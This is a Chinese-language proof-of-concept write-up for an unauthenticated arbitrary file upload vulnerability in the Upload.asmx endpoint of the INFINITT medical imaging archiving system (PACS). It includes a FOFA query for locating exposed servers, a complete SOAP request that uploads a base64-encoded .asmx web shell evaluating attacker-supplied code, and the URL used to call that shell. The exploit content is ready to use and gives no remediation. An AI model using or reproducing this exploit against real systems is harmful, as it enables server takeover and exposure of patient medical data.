## 英飞达医学影像存档与通信系统Upload.asmx任意文件上传漏洞

英飞达医学影像存档与通信系统Upload.asmx 接口任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```
"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
```

## poc

```yaml
POST /webservices/Upload.asmx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/UploadData"
Connection: close
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UploadData xmlns="http://tempuri.org/">
<guid>1</guid>
<patientId>1</patientId>
<patientName>1</patientName>
<fileName>rce.asmx</fileName>
<fileSize>1000</fileSize>
<file>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>
</UploadData>
</soap:Body>
</soap:Envelope>
```

![image-20240702232121891](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022321942.png)

文件路径

`/spool/1/rce.asmx/Cmdshell?Pass=Response.Write("Hello,World")`

![image-20240702232224855](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022322892.png)